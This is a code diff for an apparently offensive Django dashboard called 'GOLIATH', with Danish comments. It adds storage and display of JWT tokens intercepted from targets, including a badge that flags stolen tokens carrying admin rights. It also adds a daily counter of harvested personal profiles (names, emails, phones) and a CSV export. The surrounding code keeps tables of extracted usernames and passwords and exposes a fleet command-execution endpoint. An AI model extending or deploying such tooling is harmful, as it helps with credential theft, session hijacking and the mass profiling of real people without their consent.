@@ -28,6 +28,7 @@ import threading
 import glob
 import socket
 import django
+import random
 from django.conf import settings
 from django.core.management import call_command
 try:
@@ -172,6 +173,20 @@ class ExtractedApi(models.Model):
         managed = False
         app_label = 'core'
 
+class InterceptedJWT(models.Model):
+    """GOLIATH V65: Model til lynhurtig JWT Token Intelligence."""
+    id = models.AutoField(primary_key=True)
+    timestamp = models.DateTimeField()
+    source_module = models.CharField(max_length=255)
+    target = models.CharField(max_length=255)
+    token = models.TextField()
+    payload = models.TextField()
+
+    class Meta:
+        db_table = 'intercepted_jwts'
+        managed = False
+        app_label = 'core'
+
 class HarvestedData(models.Model):
     """GOLIATH V50: Model for mass-harvested JSON payloads fra API'er."""
     id = models.AutoField(primary_key=True)
@@ -286,6 +301,7 @@ with connection.cursor() as cursor:
     cursor.execute('''CREATE TABLE IF NOT EXISTS extracted_credentials (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, source_module TEXT, target TEXT, username TEXT, password TEXT)''')
     cursor.execute('''CREATE TABLE IF NOT EXISTS extracted_apis (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, source_module TEXT, target TEXT, endpoint TEXT, method TEXT)''')
     cursor.execute('''CREATE TABLE IF NOT EXISTS harvested_data (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, source_module TEXT, target TEXT, endpoint TEXT, payload TEXT)''')
+    cursor.execute('''CREATE TABLE IF NOT EXISTS intercepted_jwts (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, source_module TEXT, target TEXT, token TEXT, payload TEXT)''')
     cursor.execute('''CREATE TABLE IF NOT EXISTS master_personas (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, target TEXT, name TEXT, email TEXT, phone TEXT, social_handle TEXT, raw_data_ref TEXT)''')
     cursor.execute('''CREATE TABLE IF NOT EXISTS watchlist (id INTEGER PRIMARY KEY AUTOINCREMENT, keyword TEXT, type TEXT, added_at DATETIME)''')
     cursor.execute('''CREATE TABLE IF NOT EXISTS security_alerts (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, source_module TEXT, target TEXT, keyword TEXT, snippet TEXT, is_read BOOLEAN DEFAULT 0)''')
@@ -347,6 +363,11 @@ try:
         """Kører hvert minut og tjekker om en ScheduledHunt skal affyres (Continuous Monitoring)."""
         from django.utils import timezone
         from datetime import timedelta
+        from core.utils import datalake
+        
+        # GOLIATH AUTO-PURGE: Udfører disk-hygiejne hver gang scheduleren løber
+        datalake.purge_ephemeral_html(retention_days=7)
+        
         hunts = ScheduledHunt.objects.filter(is_active=True)
         now = timezone.now()
         for hunt in hunts:
@@ -373,6 +394,7 @@ except ImportError:
 from django.contrib.auth.decorators import login_required
 from django.contrib.auth import authenticate, login, logout
 from django.shortcuts import redirect
+from django.utils import timezone
 
 @csrf_exempt
 def login_view(request):
@@ -438,6 +460,7 @@ def dashboard(request):
         watchlist_items = WatchlistItem.objects.all().order_by('-added_at')
         security_alerts = SecurityAlert.objects.filter(is_read=False).order_by('-timestamp')[:20]
         master_personas = MasterPersona.objects.all().order_by('-confidence_score')[:20]
+        intercepted_jwts = InterceptedJWT.objects.all().order_by('-id')[:20]
         vulnerabilities = ServiceVulnerability.objects.all().order_by('-timestamp')[:15]
         fleet_nodes = FleetNode.objects.all().order_by('-last_seen')
         
@@ -462,6 +485,7 @@ def dashboard(request):
         cred_stats = {}
         email_stats = {}
         master_personas = []
+        intercepted_jwts = []
         vulnerabilities = []
         fleet_nodes = []
 
@@ -567,6 +591,15 @@ def dashboard(request):
                         <a href="/api/v1/download_report/" class="btn btn-outline-success w-100 mt-3">⬇️ Download Master Report</a>
                         <a href="/api/v1/download_verified/" class="btn btn-success w-100 mt-2 fw-bold" style="background-color: #2ecc71; color: black; border: none;">🛡️ Download Verificeret Dossier</a>
                         <a href="/api/v1/download_export/" class="btn btn-outline-warning w-100 mt-2">🔐 Download AES Export (.aes)</a>
+                        
+                        <!-- GOLIATH EXPANSION: NLP AI CSV Export (Dynamisk) -->
+                        <hr style="border-color: #3b3b54;">
+                        <label class="text-accent small fw-bold mb-1">🧠 AI Threat Intel Export</label>
+                        <div class="input-group">
+                            <span class="input-group-text bg-dark text-danger border-danger">Klynge #</span>
+                            <input type="number" id="nlpClusterId" class="form-control bg-dark text-light border-danger" value="1" min="0" max="99">
+                            <button class="btn btn-outline-danger fw-bold" type="button" onclick="window.location.href='/api/v1/intelligence/nlp_export/Cluster_' + document.getElementById('nlpClusterId').value + '/'">Download CSV</button>
+                        </div>
                     </div>
                     <div class="card p-3 mb-4">
                         <h5 class="text-accent">Modul Aktivitet (Top 100)</h5>
@@ -589,6 +622,32 @@ def dashboard(request):
                         </ul>
                     </div>
                     {% endif %}
+                    
+                    <!-- GOLIATH V65: Intercepted JWT Dash -->
+                    <div class="card p-3 mb-4" style="border-color: #00e5ff;">
+                        <h5 class="text-accent mb-3">🔑 Intercepted JWT Tokens (Payloads)</h5>
+                        <div class="table-responsive" style="max-height: 250px; overflow-y: auto;">
+                            <table class="table table-dark table-sm align-middle">
+                                <thead style="position: sticky; top: 0; z-index: 1; background: #12121c;"><tr><th>Target</th><th>Token (Truncated)</th><th>Decoded Payload</th></tr></thead>
+                                <tbody>
+                                    {% for jwt in intercepted_jwts %}
+                                    <tr>
+                                        <td class="text-warning fw-bold">{{ jwt.target }}</td>
+                                        <td class="text-muted"><small>{{ jwt.token|slice:":20" }}...</small></td>
+                                        <td>
+                                            <pre class="m-0 p-2 bg-dark text-info" style="font-size: 0.75rem; border: 1px solid #3b3b54; border-radius: 4px;">{{ jwt.payload }}</pre>
+                                            {% if '"admin": true' in jwt.payload|lower or '"role": "admin"' in jwt.payload|lower %}
+                                            <span class="badge bg-danger mt-1">🚨 ADMIN PRIVILEGES DETECTED</span>
+                                            {% endif %}
+                                        </td>
+                                    </tr>
+                                    {% empty %}
+                                    <tr><td colspan="3" class="text-center text-muted">Ingen JWT tokens opsnappet endnu.</td></tr>
+                                    {% endfor %}
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
                     
                     <!-- GOLIATH V57: Target Vulnerabilities -->
                     {% if vulnerabilities %}
@@ -1023,7 +1082,7 @@ def dashboard(request):
     """
     engine = Engine(app_dirs=False)
     template = engine.from_string(html_template)
-    context = Context({"records": records, "stats": stats, "error_msg": error_msg, "query": query, "scheduled_hunts": scheduled_hunts, "active_operations": active_operations, "emails": emails_qs, "credentials": creds_qs, "cred_stats": cred_stats, "email_stats": email_stats, "watchlist_items": watchlist_items, "security_alerts": security_alerts, "master_personas": master_personas, "vulnerabilities": vulnerabilities, "fleet_nodes": fleet_nodes, "request": request})
+    context = Context({"records": records, "stats": stats, "error_msg": error_msg, "query": query, "scheduled_hunts": scheduled_hunts, "active_operations": active_operations, "emails": emails_qs, "credentials": creds_qs, "cred_stats": cred_stats, "email_stats": email_stats, "watchlist_items": watchlist_items, "security_alerts": security_alerts, "master_personas": master_personas, "intercepted_jwts": intercepted_jwts, "vulnerabilities": vulnerabilities, "fleet_nodes": fleet_nodes, "request": request})
     return HttpResponse(template.render(context))
 
 @login_required
@@ -1188,6 +1247,20 @@ def network_graph(request):
     </html>
     """
     return HttpResponse(Engine(app_dirs=False).from_string(html_template).render(Context({"graph_data": graph_data})))
+
+@csrf_exempt
+def get_daily_stats(request):
+    """GOLIATH APEX: API Endpoint til live dashboard statistik."""
+    try:
+        today = timezone.now().date()
+        start_of_day = timezone.make_aware(datetime.combine(today, datetime.min.time()))
+        
+        # Tæller MasterPersonas oprettet siden starten af dagen
+        count = MasterPersona.objects.filter(timestamp__gte=start_of_day).count()
+        
+        return JsonResponse({"status": "success", "harvested_today": count})
+    except Exception as e:
+        return JsonResponse({"error": str(e)}, status=500)
 
 @csrf_exempt
 def trigger_scan(request):
@@ -1424,6 +1497,8 @@ urlpatterns = [
     path('api/v1/download_verified/', download_verified),
     path('api/v1/download_export/', download_export),
     path('api/v1/fleet/execute/', execute_fleet_command),
+    path('api/v1/stats/today/', get_daily_stats),
+    path('api/v1/intelligence/nlp_export/<str:cluster_name>/', download_nlp_cluster),
     path('api/v1/intelligence/persona/<int:persona_id>/', get_persona),
     path('api/v1/intelligence/verify/<int:persona_id>/', verify_persona),
 ]
